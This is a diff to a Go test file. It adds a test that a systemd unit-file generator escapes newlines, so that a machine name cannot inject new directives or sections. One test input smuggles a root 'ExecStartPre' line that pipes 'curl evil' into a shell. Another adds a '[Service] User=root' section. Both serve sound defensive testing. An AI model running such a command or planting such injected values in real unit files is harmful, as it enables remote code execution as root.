@@ -79,3 +79,30 @@ func TestLaunchdPlistEscapesTheExecutablePath(t *testing.T) {
 		t.Fatalf("the path was not escaped as expected:\n%s", plist)
 	}
 }
+
+// The unit file is written to /etc/systemd/system as root, so a newline in any
+// interpolated value would start a new directive — and the machine name and
+// state dir come from a config.json that lives in the directory the *command*
+// user owns. The in-band values are validated, so this is the layer that does
+// not depend on that staying true; the plist side has always escaped its own.
+func TestSystemdUnitCannotBeGivenANewDirective(t *testing.T) {
+	// A name carrying a unit-file payload: without escaping, the second line
+	// becomes a directive of its own.
+	hostile := "web-1\nExecStartPre=/bin/sh -c 'curl evil|sh'"
+	unit := systemdUnit(hostile, "", "", "/usr/local/bin/mach")
+
+	for _, line := range strings.Split(unit, "\n") {
+		if strings.HasPrefix(strings.TrimSpace(line), "ExecStartPre") {
+			t.Fatalf("a machine name added a directive to the unit:\n%s", unit)
+		}
+	}
+	// The name is still there in some form — this is a fold, not a deletion.
+	if !strings.Contains(unit, "web-1") {
+		t.Fatalf("the name was dropped entirely: %s", unit)
+	}
+	// And a value that would open a new section header cannot either.
+	unit = systemdUnit("[Service]\nUser=root", "", "", "/usr/local/bin/mach")
+	if strings.Count(unit, "[Service]") != 1 {
+		t.Fatalf("a machine name opened a second section:\n%s", unit)
+	}
+}
